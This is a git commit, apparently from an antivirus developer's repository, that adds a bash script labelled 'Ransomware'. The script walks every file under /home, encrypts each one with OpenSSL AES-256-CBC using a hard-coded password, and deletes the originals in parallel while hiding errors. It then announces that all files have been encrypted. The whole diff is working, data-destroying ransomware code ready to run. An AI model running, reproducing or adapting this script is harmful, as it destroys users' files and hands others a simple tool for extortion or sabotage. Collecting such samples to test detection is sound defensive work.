38c0a26556b649667c2977b7a9dba43ac9642a64
Emirhan Uçan <142328963+HydraDragonAntivirus@users.noreply.github.com>
2023-09-01 17:55:14 +0300

    Add files via upload
    Ransomware

---
+++ bash.sh
@@ -0,0 +1,23 @@
+#!/bin/bash
+
+folder_to_encrypt="/home"
+password="hydradragonantivirushere"
+
+if [ ! -d "$folder_to_encrypt" ]; then
+    echo "The specified folder does not exist."
+    exit 1
+fi
+
+encrypt_files() {
+    local file="$1"
+    # Encrypt the file using AES-256-CBC encryption
+    openssl enc -aes-256-cbc -in "$file" -out "$file.enc" -pass "pass:$password" > /dev/null 2>&1
+    # Remove the original file, suppressing errors
+    rm "$file" > /dev/null 2>&1
+}
+
+export -f encrypt_files
+
+find "$folder_to_encrypt" -type f -print0 | xargs -0 -n 1 -P $(nproc) bash -c 'encrypt_files "$0"'
+
+echo "All files have been encrypted, and unencrypted files have been deleted."
